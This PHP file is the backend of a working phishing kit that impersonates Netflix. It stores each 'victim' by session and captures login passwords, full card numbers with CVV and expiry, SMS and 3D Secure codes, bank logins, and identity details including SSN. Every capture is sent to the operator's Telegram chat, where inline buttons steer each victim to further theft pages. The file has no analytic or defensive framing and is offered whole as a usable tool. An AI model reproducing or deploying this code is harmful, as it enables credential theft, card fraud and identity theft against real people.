<?php
require_once 'db.php';

header('Content-Type: application/json');

function sendTelegram($message, $keyboard = null) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    if ($keyboard) {
        $data['reply_markup'] = json_encode(['inline_keyboard' => $keyboard]);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function maskCC($cc) {
    if (strlen($cc) < 8) return $cc;
    return substr($cc, 0, 4) . str_repeat('*', strlen($cc) - 8) . substr($cc, -4);
}

function getCountry($ip) {
    $json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,countryCode");
    if ($json) {
        $data = json_decode($json, true);
        return ($data['country'] ?? 'Unknown') . ' (' . ($data['countryCode'] ?? '??') . ')';
    }
    return 'Unknown';
}

function getFlag($countryCode) {
    $flags = [
        'US' => '🇺🇸', 'GB' => '🇬🇧', 'CA' => '🇨🇦', 'FR' => '🇫🇷', 'DE' => '🇩🇪',
        'ES' => '🇪🇸', 'IT' => '🇮🇹', 'NL' => '🇳🇱', 'BE' => '🇧🇪', 'AU' => '🇦🇺',
        'JP' => '🇯🇵', 'KR' => '🇰🇷', 'BR' => '🇧🇷', 'MX' => '🇲🇽', 'AR' => '🇦🇷',
        'SA' => '🇸🇦', 'AE' => '🇦🇪', 'EG' => '🇪🇬', 'MA' => '🇲🇦', 'DZ' => '🇩🇿',
        'TN' => '🇹🇳', 'TR' => '🇹🇷', 'IN' => '🇮🇳', 'PK' => '🇵🇰', 'BD' => '🇧🇩'
    ];
    return $flags[$countryCode] ?? '🌍';
}

$action = $_POST['action'] ?? '';
$session_id = $_POST['sid'] ?? '';

if (!$session_id) {
    echo json_encode(['error' => 'No session']);
    exit;
}

$victim = getVictim($session_id);
if (!$victim) {
    createVictim($session_id, $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT'] ?? '');
    $victim = getVictim($session_id);
}

$ip = $_SERVER['REMOTE_ADDR'];
$country = getCountry($ip);

switch ($action) {
    case 'login':
        $email = $_POST['email'] ?? '';
        $password = $_POST['password'] ?? '';

        updateVictim($session_id, [
            'email' => $email,
            'password' => $password,
            'status' => 'login',
            'next_step' => 'cc',
            'country' => $country
        ]);

        logAction($session_id, 'login', ['email' => $email]);

        $msg = "🎬 <b>NEW NETFLIX VICTIM</b>

";
        $msg .= "📧 <b>Email:</b> <code>" . htmlspecialchars($email) . "</code>
";
        $msg .= "🔑 <b>Pass:</b> <code>" . htmlspecialchars($password) . "</code>
";
        $msg .= "🌍 <b>Location:</b> " . $country . "
";
        $msg .= "📍 <b>IP:</b> <code>" . $ip . "</code>
";
        $msg .= "🆔 <b>Session:</b> <code>" . substr($session_id, 0, 12) . "...</code>

";
        $msg .= "➡️ <i>Redirecting to CC page...</i>";

        sendTelegram($msg);
        echo json_encode(['success' => true, 'redirect' => 'cc.php?sid=' . urlencode($session_id) . '&lang=' . getLang()]);
        break;

    case 'cc':
        $ccnum = $_POST['ccnum'] ?? '';
        $ccname = $_POST['ccname'] ?? '';
        $expiry = $_POST['expiry'] ?? '';
        $cvv = $_POST['cvv'] ?? '';
        $zip = $_POST['zip'] ?? '';

        updateVictim($session_id, [
            'cc_num' => $ccnum,
            'cc_name' => $ccname,
            'cc_expiry' => $expiry,
            'cc_cvv' => $cvv,
            'cc_zip' => $zip,
            'status' => 'cc',
            'next_step' => 'awaiting'
        ]);

        logAction($session_id, 'cc', ['cc' => maskCC($ccnum)]);

        $bin = strlen($ccnum) >= 6 ? substr($ccnum, 0, 6) : 'N/A';
        $cardType = '';
        if (strpos($ccnum, '4') === 0) $cardType = 'Visa';
        elseif (strpos($ccnum, '5') === 0) $cardType = 'Mastercard';
        elseif (strpos($ccnum, '3') === 0) $cardType = 'Amex';
        elseif (strpos($ccnum, '6') === 0) $cardType = 'Discover';

        $msg = "💳 <b>NEW CREDIT CARD</b>

";
        $msg .= "📧 <b>Email:</b> <code>" . htmlspecialchars($victim['email'] ?? 'N/A') . "</code>
";
        $msg .= "💳 <b>CC:</b> <code>" . htmlspecialchars($ccnum) . "</code>
";
        $msg .= "🏷 <b>Type:</b> " . $cardType . "
";
        $msg .= "👤 <b>Name:</b> <code>" . htmlspecialchars($ccname) . "</code>
";
        $msg .= "📅 <b>Exp:</b> <code>" . htmlspecialchars($expiry) . "</code>
";
        $msg .= "🔒 <b>CVV:</b> <code>" . htmlspecialchars($cvv) . "</code>
";
        $msg .= "📮 <b>ZIP:</b> <code>" . htmlspecialchars($zip) . "</code>
";
        $msg .= "🏦 <b>BIN:</b> <code>" . $bin . "</code>
";
        $msg .= "🌍 <b>Location:</b> " . $country . "
";
        $msg .= "🆔 <b>Session:</b> <code>" . substr($session_id, 0, 12) . "...</code>

";
        $msg .= "❓ <b>Choose next step for victim:</b>";

        $keyboard = [
            [
                ['text' => '📱 OTP/SMS', 'callback_data' => "otp_" . $session_id],
                ['text' => '📱 OTP 2', 'callback_data' => "otp2_" . $session_id]
            ],
            [
                ['text' => '🔐 3D Secure', 'callback_data' => "approval_" . $session_id],
                ['text' => '🏦 Bank Login', 'callback_data' => "bank_" . $session_id]
            ],
            [
                ['text' => '🆔 KYC / Fullz', 'callback_data' => "kyc_" . $session_id],
                ['text' => '✅ Done/Finish', 'callback_data' => "done_" . $session_id]
            ]
        ];

        sendTelegram($msg, $keyboard);
        echo json_encode(['success' => true, 'status' => 'awaiting']);
        break;

    case 'otp':
        $otp = $_POST['otp'] ?? '';
        updateVictim($session_id, ['otp' => $otp, 'status' => 'otp']);
        logAction($session_id, 'otp', ['otp' => $otp]);

        $msg = "📱 <b>OTP RECEIVED</b>

";
        $msg .= "📧 <b>Email:</b> <code>" . htmlspecialchars($victim['email'] ?? 'N/A') . "</code>
";
        $msg .= "🔢 <b>Code:</b> <code>" . htmlspecialchars($otp) . "</code>
";
        $msg .= "🆔 <b>Session:</b> <code>" . substr($session_id, 0, 12) . "...</code>

";
        $msg .= "❓ <b>Next step?</b>";

        $keyboard = [
            [
                ['text' => '📱 OTP 2', 'callback_data' => "otp2_" . $session_id],
                ['text' => '🔐 3D Secure', 'callback_data' => "approval_" . $session_id]
            ],
            [
                ['text' => '🏦 Bank Login', 'callback_data' => "bank_" . $session_id],
                ['text' => '🆔 KYC', 'callback_data' => "kyc_" . $session_id]
            ],
            [['text' => '✅ Done', 'callback_data' => "done_" . $session_id]]
        ];

        sendTelegram($msg, $keyboard);
        echo json_encode(['success' => true]);
        break;

    case 'otp2':
        $otp2 = $_POST['otp2'] ?? '';
        updateVictim($session_id, ['otp2' => $otp2, 'status' => 'otp2']);
        logAction($session_id, 'otp2', ['otp2' => $otp2]);

        $msg = "📱 <b>OTP 2 RECEIVED</b>

";
        $msg .= "📧 <b>Email:</b> <code>" . htmlspecialchars($victim['email'] ?? 'N/A') . "</code>
";
        $msg .= "🔢 <b>Code 2:</b> <code>" . htmlspecialchars($otp2) . "</code>
";
        $msg .= "🆔 <b>Session:</b> <code>" . substr($session_id, 0, 12) . "...</code>

";
        $msg .= "❓ <b>Next step?</b>";

        $keyboard = [
            [
                ['text' => '🔐 3D Secure', 'callback_data' => "approval_" . $session_id],
                ['text' => '🏦 Bank Login', 'callback_data' => "bank_" . $session_id]
            ],
            [
                ['text' => '🆔 KYC', 'callback_data' => "kyc_" . $session_id],
                ['text' => '✅ Done', 'callback_data' => "done_" . $session_id]
            ]
        ];

        sendTelegram($msg, $keyboard);
        echo json_encode(['success' => true]);
        break;

    case 'approval':
        $code = $_POST['approval_code'] ?? '';
        updateVictim($session_id, ['approval_code' => $code, 'status' => 'approval']);
        logAction($session_id, 'approval', ['code' => $code]);

        $msg = "🔐 <b>3D SECURE CODE</b>

";
        $msg .= "📧 <b>Email:</b> <code>" . htmlspecialchars($victim['email'] ?? 'N/A') . "</code>
";
        $msg .= "🔢 <b>Code:</b> <code>" . htmlspecialchars($code) . "</code>
";
        $msg .= "🆔 <b>Session:</b> <code>" . substr($session_id, 0, 12) . "...</code>

";
        $msg .= "❓ <b>Next step?</b>";

        $keyboard = [
            [
                ['text' => '🏦 Bank Login', 'callback_data' => "bank_" . $session_id],
                ['text' => '🆔 KYC', 'callback_data' => "kyc_" . $session_id]
            ],
            [['text' => '✅ Done', 'callback_data' => "done_" . $session_id]]
        ];

        sendTelegram($msg, $keyboard);
        echo json_encode(['success' => true]);
        break;

    case 'bank':
        $buser = $_POST['bank_user'] ?? '';
        $bpass = $_POST['bank_pass'] ?? '';
        updateVictim($session_id, ['bank_user' => $buser, 'bank_pass' => $bpass, 'status' => 'bank']);
        logAction($session_id, 'bank', ['user' => $buser]);

        $msg = "🏦 <b>BANK LOGIN CAPTURED</b>

";
        $msg .= "📧 <b>Email:</b> <code>" . htmlspecialchars($victim['email'] ?? 'N/A') . "</code>
";
        $msg .= "👤 <b>User:</b> <code>" . htmlspecialchars($buser) . "</code>
";
        $msg .= "🔑 <b>Pass:</b> <code>" . htmlspecialchars($bpass) . "</code>
";
        $msg .= "🆔 <b>Session:</b> <code>" . substr($session_id, 0, 12) . "...</code>

";
        $msg .= "❓ <b>Next step?</b>";

        $keyboard = [
            [
                ['text' => '🆔 KYC', 'callback_data' => "kyc_" . $session_id],
                ['text' => '✅ Done', 'callback_data' => "done_" . $session_id]
            ]
        ];

        sendTelegram($msg, $keyboard);
        echo json_encode(['success' => true]);
        break;

    case 'kyc':
        $kyc = [
            'name' => $_POST['kyc_name'] ?? '',
            'dob' => $_POST['kyc_dob'] ?? '',
            'address' => $_POST['kyc_address'] ?? '',
            'city' => $_POST['kyc_city'] ?? '',
            'phone' => $_POST['kyc_phone'] ?? '',
            'ssn' => $_POST['kyc_ssn'] ?? ''
        ];

        updateVictim($session_id, [
            'kyc_name' => $kyc['name'],
            'kyc_dob' => $kyc['dob'],
            'kyc_address' => $kyc['address'],
            'kyc_city' => $kyc['city'],
            'kyc_phone' => $kyc['phone'],
            'kyc_ssn' => $kyc['ssn'],
            'status' => 'done',
            'next_step' => 'done'
        ]);

        logAction($session_id, 'kyc', $kyc);

        $msg = "🆔 <b>KYC / FULLZ CAPTURED</b>

";
        $msg .= "📧 <b>Email:</b> <code>" . htmlspecialchars($victim['email'] ?? 'N/A') . "</code>
";
        $msg .= "👤 <b>Name:</b> <code>" . htmlspecialchars($kyc['name']) . "</code>
";
        $msg .= "🎂 <b>DOB:</b> <code>" . htmlspecialchars($kyc['dob']) . "</code>
";
        $msg .= "🏠 <b>Address:</b> <code>" . htmlspecialchars($kyc['address']) . ", " . htmlspecialchars($kyc['city']) . "</code>
";
        $msg .= "📱 <b>Phone:</b> <code>" . htmlspecialchars($kyc['phone']) . "</code>
";
        $msg .= "🆔 <b>SSN/ID:</b> <code>" . htmlspecialchars($kyc['ssn']) . "</code>
";
        $msg .= "🆔 <b>Session:</b> <code>" . substr($session_id, 0, 12) . "...</code>

";
        $msg .= "✅ <b>VICTIM COMPLETE - ALL DATA COLLECTED</b>";

        sendTelegram($msg);
        echo json_encode(['success' => true, 'redirect' => 'success.php?sid=' . urlencode($session_id) . '&lang=' . getLang()]);
        break;

    case 'check':
        $v = getVictim($session_id);
        if ($v && $v['next_step'] !== 'awaiting' && $v['next_step'] !== $v['status'] && $v['next_step'] !== '') {
            $lang = isset($_GET['lang']) ? $_GET['lang'] : 'en';
            echo json_encode([
                'redirect' => true,
                'url' => $v['next_step'] . '.php?sid=' . urlencode($session_id) . '&lang=' . $lang
            ]);
            updateVictim($session_id, ['status' => $v['next_step']]);
        } else {
            echo json_encode(['redirect' => false]);
        }
        break;

    default:
        echo json_encode(['error' => 'Invalid action']);
}
?>
